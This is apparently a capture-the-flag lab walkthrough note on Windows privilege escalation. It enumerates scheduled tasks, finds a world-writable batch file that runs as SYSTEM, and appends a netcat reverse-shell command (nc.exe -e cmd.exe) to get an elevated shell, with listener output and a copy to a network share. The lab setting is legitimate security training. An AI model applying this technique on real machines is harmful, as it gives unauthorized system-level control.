## Connect to WRK2
- [[Connect to 10.200.X.22 via RDP]]
- Open a command shell.
- Look at the "C:\Users\laura.wood\Downloads>" directory.
- There's a nc.exe file. (Netcat)
	- If we manage to find some service or application that is running in the machine with administrator or system privileges, we might be able to execute netcat with administrative privileges, gaining an elevated administrative shell.
	- One quick way of escalating privileges inside a machine is through a misconfigured scheduled task, especially when it is using a binary or batch file that we can modify.

## List of tasks
- By using the command schtasks /query /fo csv /v | findstr “SYSTEM > tasks.csv”,we are able to forward a list of several tasks, to a CSV file, that run with administrative privileges (the /fo csv will print the text in a CSV format).

C:\Users\laura.wood> `schtasks /query /fo csv /v | findstr “SYSTEM > tasks.csv”`

Based on the output, most of the tasks run from the Windows directory, which normally means that those tasks are well configured. A quick search into the CSV reveals that a certain task runs from the following file (**C:\SYNC\sync.bat**):

![[Privilege Access to CORP Tier 2 - WRK1 and wrk2-20240630151034676.webp]]

## Query for the taskname
Query for the taskname, in order to get more information regarding the schedule task:
C:\Users\laura.wood> `schtasks /query /fo list /tn FULLSYNC /v`

![[Privilege Access to CORP Tier 2 - WRK1 and wrk2-20240630151247545.webp]]

We can check the permissions of the file with the command icacls C:\SYNC\sync.bat and are able to confirm that our user has (F) Full Access to the file.

> FULLSYNC scheduled task runs every 5 minutes.

## Check the permissions of the file "C:\SYNC\sync.bat"

PS C:\Users\laura.wood> `icacls C:\SYNC\sync.bat`
```
Everyone:(F)
BUILTIN\Users:(F)
NT AUTHORITY\SYSTEM:(I)(F)
BUILTIN\Administrators:(I)(F)
BUILTIN\Users:(I)(RX)
```

> - Full access on the sync.bat file.

## Set up a listener with the previously found netcat

With this information, we know that we can set up a listener with the previously found netcat executable, and edit the task to connect with the same executable with administrative privileges, receiving an elevated reverse shell:

C:\Users\laura.wood\Downloads> `nc -lnvp 4444`

listening on [any] 4444 ...

## Edit the sync.bat file

Path: C:\SYNC

Add the following code:
`C:\Users\laura.wood\Downloads\nc.exe -e cmd.exe 127.0.0.1 4444`
`copy C:\Windows\Temp \\s3.corp.thereserve.loc\backups\`

> After a couple of minutes (5 at most) you should receive an administrative reverse shell.
## Execute the task to force a reverse shell
If you want to execute the task immediately, run the following command.
`
C:\Users\laura.wood> `schtasks /run /tn FULLSYNC`


> SUCCESS: Attempted to run the scheduled task "FULLSYNC". 

On the first command shell you'll see the following output.

listening on [any] 4444 ...
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 54255
Microsoft Windows [Version 10.0.17763.4252]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>

## Authenticate the flags on e-citizen

> Flag-4 Administrative access to Corporate Division Tier 2 Infrastructure

[[Flag Submission Process]]

Next step: